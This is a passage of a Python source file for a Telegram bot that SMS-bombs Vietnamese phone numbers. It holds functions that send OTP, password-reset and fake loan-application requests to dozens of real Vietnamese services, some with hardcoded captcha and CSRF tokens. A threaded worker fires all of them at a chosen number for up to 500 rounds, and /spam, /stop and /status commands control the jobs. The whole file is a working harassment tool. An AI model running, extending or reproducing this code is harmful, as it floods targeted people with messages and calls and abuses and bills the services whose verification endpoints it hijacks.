        print(f"[Routine] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_vayvnd(phone: str):
    try:
        json_data_1 = {
            'phone': phone,
            'utm': [{'utm_source': 'leadbit', 'utm_medium': 'cpa'}],
            'cpaId': 2,
            'cpaLeadData': {'click_id': '66A8D2827EED7B49190B756A', 'utm_campaign': '44559'},
            'sourceSite': 3,
            'regScreenResolution': {'width': 1920, 'height': 1080},
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        session.post('https://api.vayvnd.vn/v2/users', json=json_data_1, timeout=8)
        
        json_data_2 = {
            'login': phone,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        }
        session.post('https://api.vayvnd.vn/v2/users/password-reset', json=json_data_2, timeout=8)
        
        json_data_3 = {
            'login': phone,
            'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
            'antispamCheckData': {
                'hostname': 'vayvnd.vn',
                'recaptchaResponse': '03AFcWeA4a3of5F2rQflfDDN3PoKGexeshUPBijwHLLt_g5MKfy8DOVF7AtAdhNcRg0tk8OxQFZMluITyXgxDF56auNDfD2IqOBzc_0YEQKhjz28R_3Cv7da1x3t73L6y1uGHmh_vbGE4nwjMo6uqQD_4XaGXbrjK3A_MECVrnlxqSzdcFHT_dWY8dZY_XZrVZD8qAaRrxewtpoGroniGyrMXDQBqvpO8cv5NHF6HzebGbHr9pcFdjurawUgyfpvJaIf818dt0Fl71g6BYQ2PDWk81ZI7m6Zz2sIcb_RINTz4VPgnKHO2EYvhnMkxdVHf5H2u5sV1eJuQ-Ess3AgShIQXTbUhorpjz9CDlnKfwcMtQmV47LB_wrJIhkGAyjO2s4Uadi_DJaoqQuk5KzpgWbG0v7hVWoL_FtCxdRioMgrj4zMMGHGUGjsaHUw5f1FJ5ehwPX3BbfFDxgv6G-LAhPOJ6D7QtWP_2K-1Di2Y-DMBiM15k4sr9-jQq7Hb6i44Df3m0Pe4sF8w4DD6rCrj7qMhQFhz-FxTCMyKg1AZttUoWVYEpkuEudROLWWBoATDsLwdO1ICLaEGeA9V0dRfcFYNm1bpF8AC7Iuya-df_55Uvb3UP1bGDNEvkTPXZIN8gFosYfWFTOt6JbTdWBM11vNT1YzC9rAIsrgCG3FShXF_6dy7_uxJ9v2gykpQ6bHe9EMJEK9xsQn50kOTTXOLJPXxOdplk4LdQfVzgkWsMnGPhbtK5n5E8hFHz--vQy61eAHHJ0gxs1ybOgFpEn53BDkKWXyOrOvvEDDdffBhwwDcl1C5zKRN1-_gYLfgEMI8Hxmq7AWfF_kQ6eOPq2DM5JY01v4nuLj06s-RQwyKO_R1q6IS5LvWek425nDxjt7ihJLbfUotuMCWDvnBm_pSm05pTm8WL6twt9vLd_K4BB-ME-5DFAHbmopkZj6rGQhXGLMWEU-rvgOG-qgZ1_VE_0-j254Sw19qZcz_bdUGXxeblMoWThlaMf8OQT5s9O1enSYTPWCtMhWsgDT5Crb2xMGHWkO5nbC0X2KOT-uNWNIMldpA3DSs4jTSecEhZW2NPAjygBqSs4ZsllUOl8gaq5hv352ysq6T6nFs_fpoBhCNnhNQR0_G3Qw80ZS7cfC1YlCoDAItOd9AgD0oWsvjV9gUkSz9WgmkCL0vxnndR2ixnyolsRZqMxT7Q8RirZZU-plNUDW0Tj7cfkGPib4MFZ5P3J08LPP1uSeuctw4HXSRheltiEvu5IFZ4UExasH5yMbyTBYSrAMw9IlO3s8KnNu9UQMX9pOzjo8wXdS4QiSoOo0PjQ4RV881eL6ojJv-py9IVmezFvPohm9JmcFRgzuXWnv5WpXyclW1AhTHjGc19emxXc92q2fnqouvYr3-cgQtFyHJInovng8kmUBa-d8mSuT-36a6LaiqKLi-cw0sCVXHmOdXnULf7DMh48AD6VLDw49jwYeczc3K3WJDz0cWJDPZwen8GmC-uuhIGi1hER1q6Mfq01GCKs2lLwbmCysD9xURNFGXu9NUjHoE0J6QHlxdq95scnOone1SIivS0Y9OlK192g_C_c26g-7-aMft1_QQ4pb7r7asb-yHglSBAdL3DMHk4ig2qMf5bMX2Z01GDbt6pAC0UIjtsuSI0zwNQiyWV6rePlXp9_5n0VZD2svaUel7KnIv6SFyrwo2kk1Y1iaahtbk6rIWYW-oYcU4Xo67PzkSkd5o2BdVbMNoqyoE3_64SdGbCJhpMixqxBJTKVqeKn0ohM1H7m8RDs-ECaAfEHO8j96z1E1P2m0HVO5zJNB-8WnIEW3gJ1X5OjymNfqrMNr94626PA04O9_-NPTwuKFmIJZE2aEtItXRBvXR1GUZBdpH32PrECRp8Mo-sOz1W7UBwkvAfaOvYDn3zJ-k54emVQ4bf-vEpvDLYKtffIHmy1dcSMP8vhJJgykim-fxJ8cEYYKpRxWrE9CiobKH78pDTEIWIj8GzCkxrqbe4ycj5kA',
            },
        }
        r = session.post('https://api.vayvnd.vn/v2/users/password-reset', json=json_data_3, timeout=10)
        print(f"[vayvnd] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_tima(phone: str):
    try:
        data = {
            'application_full_name': 'Nguyen Van A',
            'application_mobile_phone': phone,
            'CityId': '1',
            'DistrictId': '16',
            'rules': 'true',
            'TypeTime': '1',
            'application_amount': '0',
            'application_term': '0',
            'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
            'IsApply': '1',
            'ProvinceName': 'ThÃ&nbsp;nh phá»‘ HÃ&nbsp; Ná»™i',
            'DistrictName': 'Huyá»‡n SÃ³c SÆ¡n',
            'product_id': '2',
        }
        r = session.post('https://tima.vn/Borrower/RegisterLoanCreditFast', data=data, timeout=10)
        print(f"[tima] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_paynet(phone: str):
    try:
        data = {
            'MobileNumber': phone,
            'IsForget': 'N',
        }
        r = session.post('https://merchant.paynetone.vn/User/GetOTP', data=data, verify=False, timeout=10)
        print(f"[paynet] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_moneygo(phone: str):
    try:
        data = {
            '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
            'total': '56688000',
            'phone': phone,
            'agree': '1',
        }
        r = session.post('https://moneygo.vn/dang-ki-vay-nhanh', data=data, timeout=10)
        print(f"[moneygo] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_pico(phone: str):
    try:
        json_data_1 = {
            'name': 'Nguyen Van A',
            'phone': phone,
            'provinceCode': '92',
            'districtCode': '925',
            'wardCode': '31261',
            'address': '123',
        }
        session.post('https://auth.pico.vn/user/api/auth/register', json=json_data_1, timeout=8)
        
        json_data_2 = {'phone': phone}
        r = session.post('https://auth.pico.vn/user/api/auth/login/request-otp', json=json_data_2, timeout=10)
        print(f"[pico] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_PNJ(phone: str):
    try:
        data = {
            '_method': 'POST',
            '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
            'type': 'zns',
            'phone': phone,
        }
        r = session.post('https://www.pnj.com.vn/customer/otp/request', data=data, timeout=10)
        print(f"[PNJ] {phone} → {r.status_code}")
    except:
        pass

def send_otp_via_TINIWORLD(phone: str):
    try:
        data = {
            '_csrf': '',
            'clientId': '609168b9f8d5275ea1e262d6',
            'redirectUrl': 'https://tiniworld.com',
            'phone': phone,
        }
        r = session.post('https://prod-tini-id.nkidworks.com/auth/tinizen', data=data, timeout=10)
        print(f"[TINIWORLD] {phone} → {r.status_code}")
    except:
        pass

##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################

##################################################################################################################################################################################

def send_otp_via_takomo(phone: str):
    try:
        session.get(f'https://lk.takomo.vn/?phone={phone}', timeout=8)
        json_data = {"data": {"phone": phone, "code": "resend", "channel": "ivr"}}
        r = session.post('https://lk.takomo.vn/api/4/client/otp/send', json=json_data, timeout=10)
        print(f"[takomo] {phone} → {r.status_code}")
    except:
        pass
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################
##################################################################################################################################################################################

##################################################################################################################################################################################
ALL_SENDERS = [
        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
        send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
        send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
        send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
        send_otp_via_WinMart, send_otp_via_vietloan, send_otp_via_lozi, send_otp_via_F88,
        send_otp_via_spacet, send_otp_via_vinpearl, send_otp_via_traveloka, send_otp_via_dongplus,
        send_otp_via_longchau, send_otp_via_longchau1, send_otp_via_galaxyplay, send_otp_via_emartmall,
        send_otp_via_ahamove, send_otp_via_ViettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
        send_otp_via_popeyes, send_otp_via_ACHECKIN, send_otp_via_APPOTA, send_otp_via_Watsons,
        send_otp_via_hoangphuc, send_otp_via_fmcomvn, send_otp_via_Reebokvn, send_otp_via_thefaceshop,
        send_otp_via_BEAUTYBOX, send_otp_via_winmart, send_otp_via_medicare, send_otp_via_futabus,
        send_otp_via_ViettelPost, send_otp_via_myviettel2, send_otp_via_myviettel3, send_otp_via_TOKYOLIFE,
        send_otp_via_30shine, send_otp_via_Cathaylife, send_otp_via_dominos, send_otp_via_vinamilk,
        send_otp_via_vietloan2, send_otp_via_batdongsan, send_otp_via_GUMAC, send_otp_via_mutosi,
        send_otp_via_mutosi1, send_otp_via_vietair, send_otp_via_FAHASA, send_otp_via_hopiness,
        send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
        send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
        send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
    ]

# HAM CHAY SPAM MOT SO
def spam_worker(phone: str, total_rounds: int, stop_event: threading.Event):
    for round_num in range(1, total_rounds + 1):
        if stop_event.is_set():
            print(f"[{phone}] Da dung tai vong {round_num}")
            break

        print(f"[{phone}] Vong {round_num}/{total_rounds} bat dau")

        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS_PER_TARGET) as executor:
            futures = [executor.submit(fn, phone) for fn in ALL_SENDERS]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result(timeout=12)
                except:
                    pass

        delay = random.uniform(*DELAY_BETWEEN_ROUNDS_SEC)
        for _ in range(int(delay)):
            if stop_event.is_set():
                break
            time.sleep(1)

    print(f"[{phone}] Ket thuc - {round_num-1} vong")
    with jobs_lock:
        active_jobs.pop(phone, None)

# CAC LENH TELEGRAM
@bot.message_handler(commands=['start', 'help'])
def cmd_start(message: Message):
    bot.reply_to(message, "Lenh:\n/spam <so> <so vong>\n/stop <so> hoac /stopall\n/status")

@bot.message_handler(commands=['spam'])
def cmd_spam(message: Message):
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "Dung: /spam 0909123456 30")
        return

    phone = parts[1].strip()
    try:
        count = int(parts[2])
    except:
        bot.reply_to(message, "So vong phai la so nguyen.")
        return

    if count < 1 or count > 500:
        bot.reply_to(message, "So vong: 1-500")
        return

    if not is_valid_vn_phone(phone):
        bot.reply_to(message, "So khong hop le (03/05/07/08/09 + 8 so)")
        return

    with jobs_lock:
        if phone in active_jobs:
            bot.reply_to(message, f"{phone} dang chay. Dung /stop {phone}")
            return
        if len(active_jobs) >= MAX_CONCURRENT_TARGETS:
            bot.reply_to(message, f"Dat gioi han {MAX_CONCURRENT_TARGETS} job.")
            return

        stop_event = threading.Event()
        job_thread = threading.Thread(target=spam_worker, args=(phone, count, stop_event), daemon=True)

        active_jobs[phone] = {
            'stop_event': stop_event,
            'thread': job_thread,
            'rounds': count,
            'started': datetime.now(),
            'chat_id': message.chat.id
        }
        job_thread.start()

    bot.reply_to(message, f"Bat dau spam {phone} ({count} vong). Dung /stop {phone} de dung.")

@bot.message_handler(commands=['stop'])
def cmd_stop(message: Message):
    parts = message.text.split()
    target = parts[1].strip() if len(parts) > 1 else None

    with jobs_lock:
        if target:
            if target not in active_jobs:
                bot.reply_to(message, f"Khong tim thay {target}")
                return
            active_jobs[target]['stop_event'].set()
            bot.reply_to(message, f"Da yeu cau dung {target}...")
        else:
            if not active_jobs:
                bot.reply_to(message, "Khong co job nao dang chay.")
                return
            lines = ["Job dang chay:"]
            for ph, info in active_jobs.items():
                elapsed = (datetime.now() - info['started']).seconds // 60
                lines.append(f"- {ph} ({info['rounds']} vong) - {elapsed} phut")
            bot.reply_to(message, "\n".join(lines))

@bot.message_handler(commands=['stopall'])
def cmd_stopall(message: Message):
    with jobs_lock:
        cnt = len(active_jobs)
        if cnt == 0:
            bot.reply_to(message, "Khong co job nao.")
            return
        for info in active_jobs.values():
            info['stop_event'].set()
        bot.reply_to(message, f"Da yeu cau dung tat ca ({cnt} job).")

@bot.message_handler(commands=['status'])
def cmd_status(message: Message):
    with jobs_lock:
        if not active_jobs:
            bot.reply_to(message, "Khong co job nao.")
            return
        lines = [f"Dang chay {len(active_jobs)}/{MAX_CONCURRENT_TARGETS} job:"]
        for ph, info in active_jobs.items():
            start_str = info['started'].strftime("%H:%M:%S")
            lines.append(f"- {ph} - {info['rounds']} vong - bat dau {start_str}")
        bot.reply_to(message, "\n".join(lines))

# FLASK + POLLING
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot dang chay"

def run_polling():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(10)

if __name__ == '__main__':
    threading.Thread(target=run_polling, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
